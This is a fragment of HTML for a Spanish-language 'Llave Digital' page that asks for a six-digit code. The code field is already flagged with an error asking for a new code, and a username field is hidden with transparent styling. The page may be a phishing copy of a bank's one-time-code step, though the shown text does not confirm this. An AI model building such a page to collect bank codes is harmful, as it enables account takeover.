...
Llave Digital</span></h1>
                                             ...
                                             <div class="form-group has-error">
                                                <div class="form-group-text"><label class="control-label" for=""><span>Ingresa el código</span></label></div>
                                                <div class="form-group-container">
                                                   <div class="input-group">
                                                       <input class="form-control" placeholder=""  id="DocumentNumber" name="DocumentNumber" type="tel" maxlength="6" minlength="6" required  value="">
                                                      
                                                   </div>
                                                   <div class="form-group-error font-size-08rem "><span>Ingrese un nuevo código</span></div>
                                                </div>
                                             </div>
                                  ...
                                  <input type="text" name="input-username" id="input-username" readonly  style="border: none;background: transparent;outline: none;color: transparent;" >
                                 <section class="container--layout">
                                    <div class="container">
                                       <div class="justify-content-center row">
                                          <div xl="6" class="align-items-left reset-padding col-lg-6 col-md-6 col-sm-12"><button type="submit" class="  btn btn-primary btn-block"><span>CONFIRMAR LLAVE</span></button></div>
                                          <div xl="6" class="reset-padding align-items-right text-align-center margin-top-05rem-mb margin-bottom-1rem-mb col-lg-6 col-md-6 col-sm-12">
                                             <div class="c-control c-control-block c-control--switch c-control-switch form-group">
                                                <input id="rememberEmail" tabindex="-1" class="c-control-input" type="checkbox" form="[object Object]" name="rememberEmail" value="true">
